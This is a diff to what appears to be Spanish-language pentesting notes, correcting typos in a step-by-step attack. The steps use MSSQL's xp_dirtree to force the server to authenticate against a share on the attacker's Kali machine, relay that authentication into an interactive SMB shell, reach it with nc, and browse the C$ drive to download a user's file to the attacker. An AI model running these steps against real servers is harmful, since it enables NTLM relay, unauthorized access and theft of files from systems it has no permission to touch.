@@ -260,17 +260,17 @@ Paso 2:
 
 ```bash 
 Paso 3:
-# Dentro del server MSSQL forzaar la autenticación 
+# Dentro del server MSSQL forzar la autenticación 
 ❯ xp_dirtree \\IP_Kali\test    # Consultar un recurso en Kali que no exista
 ```
 
 ```bash 
 # Una vez que el reponder muestre lo siguiente:
-	[*] smb:///@10.1.210.11 [1] -> Started interactive SMB client shell via TCP on 127.0.0.1:11000
+	[*] smb:///@10.1.210.11 [1] -> Started interactive SMB client shell via TCP on 127.0.0.1:11000  <- IMPORTANTE
 
 Paso 4:
 ❯ nc 127.0.0.1 11000    # Ingresar a la sesión obtenida
-	❯ use C$            # Utilizaar el disco C: 
+	❯ use C$            # Utilizar el disco C:\ 
 	❯ ls                # Listar el contenido 
 	❯ cd Users/user     # Ir al directorio de un usuario 
 	❯ get file.lnk      # Descargar un archivo del server a Kali   
